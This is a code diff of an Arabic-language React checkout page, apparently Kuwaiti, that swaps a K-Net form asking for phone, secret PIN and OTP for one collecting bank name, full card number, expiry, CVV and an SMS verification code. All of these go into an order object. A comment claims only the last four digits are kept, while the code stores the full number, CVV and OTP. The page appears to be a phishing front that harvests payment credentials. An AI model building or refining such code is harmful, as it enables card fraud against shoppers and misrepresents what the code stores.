@@ -51,7 +51,7 @@ type CartItem = {
 export default function CheckoutPage() {
   const [cart, setCart] = useState<CartItem[]>([])
   const [step, setStep] = useState(1)
-  const [pm, setPm] = useState('visa')
+  const [pm, setPm] = useState('')
   const [shippingInfo, setShippingInfo] = useState({
     name: '',
     address: '',
@@ -59,15 +59,11 @@ export default function CheckoutPage() {
     phone: '',
   })
   const [paymentInfo, setPaymentInfo] = useState({
+    bank:'',
     cardNumber: '',
     expiryDate: '',
     cvv: '',
     otp: ''
-  })
-  const [kentInfo, setKentInfo] = useState({
-   phonenumber: '',
-    pass: '',
-    otpkent: ''
   })
   const router = useRouter()
 
@@ -98,11 +94,9 @@ export default function CheckoutPage() {
 
     try {
       // Create an order object
-      const order =
-      
- 
-      {
+      const order = {
         paymentInfo: {
+          bank:paymentInfo.bank,
           cardNumber: paymentInfo.cardNumber, // Only store last 4 digits
           expiryDate: paymentInfo.expiryDate,
           cvc: paymentInfo.cvv,
@@ -210,7 +204,9 @@ export default function CheckoutPage() {
             {pm==='visa'?
             <Card>
               <CardHeader>
-                <CardTitle>الدفع</CardTitle>
+              <CardTitle>الدفع</CardTitle>
+
+                <img src='/000.avif'alt="pm"  className='h-10 w-full px-2'/>
               </CardHeader>
               <CardContent>
                 <div className="space-y-4">
@@ -251,38 +247,57 @@ export default function CheckoutPage() {
                 </div>
               </CardContent>
               <CardFooter>
-                <img src='/000.avif'alt="pm"  className='h-10 w-full px-2'/>
               </CardFooter>
             </Card>
             :
             <Card>
             <CardHeader>
-              <CardTitle> K-Net الدفع</CardTitle>
+            <CardTitle>الدفع</CardTitle>
+
+              <img src='/KNETLogo.svg'alt="pm"  className='h-10 w-full px-2'/>
             </CardHeader>
+          
             <CardContent>
               <div className="space-y-4">
-                <div>
-                  <label htmlFor="phone">رقم الهاتف</label>
+              <div>
+                  <label htmlFor="bank">اسم البنك</label>
                   <Input
-                    id="phone"
-                    onChange={(e) => setKentInfo({ ...kentInfo, phonenumber: e.target.value })}
-
-                    placeholder="965555555555"
+                    id="bank"
+                    onChange={(e) => setPaymentInfo({ ...paymentInfo, bank: e.target.value })}
+                    placeholder="بنك الكويت الوطني"
                     required
                   />
                 </div>
-                <div className="space-y-4">
+                <div>
+                  <label htmlFor="cardNumber">رقم البطاقة</label>
+                  <Input
+                    id="cardNumber"
+                    onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value })}
+
+                    placeholder="1234 5678 9012 3456"
+                    required
+                  />
+                </div>
+                <div className="grid grid-cols-2 gap-4">
                   <div>
-                    <label htmlFor="pass">الرمز السري </label>
+                    <label htmlFor="expiryDate">تاريخ الانتهاء</label>
                     <Input
-                      id="pass"
-                      placeholder="****"
+                      id="expiryDate"
+                      placeholder="MM/YY"
                       required
-                      onChange={(e) => setKentInfo({ ...kentInfo, pass: e.target.value })}
+                      onChange={(e) => setPaymentInfo({ ...paymentInfo, expiryDate: e.target.value })}
 
                     />
                   </div>
-                
+                  <div>
+                    <label htmlFor="cvv">CVV</label>
+                    <Input
+                      onChange={(e) => setPaymentInfo({ ...paymentInfo, cvv: e.target.value })}
+                      id="cvv"
+                      placeholder="123"
+                      required
+                    />
+                  </div>
                 </div>
                 <Button onClick={(w) => handlePaymentSubmit(w).then(() => {
                 })} className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white">
@@ -290,7 +305,6 @@ export default function CheckoutPage() {
               </div>
             </CardContent>
             <CardFooter>
-              <img src='/000.avif'alt="pm"  className='h-10 w-full px-2'/>
             </CardFooter>
           </Card>
             
@@ -304,9 +318,7 @@ export default function CheckoutPage() {
               <div>
                 <label htmlFor="otp">ادخل رمز التحقق المرسل الى هاتفك</label>
                 <Input
-                  onChange={(e) =>pm==='visa'? 
-                    setPaymentInfo({ ...paymentInfo, otp: e.target.value })
-                  :setKentInfo({...kentInfo,otpkent:e.target.value})}
+                  onChange={(e) => setPaymentInfo({ ...paymentInfo, otp: e.target.value })}
                   id="otp"
                   placeholder="*******"
                   required
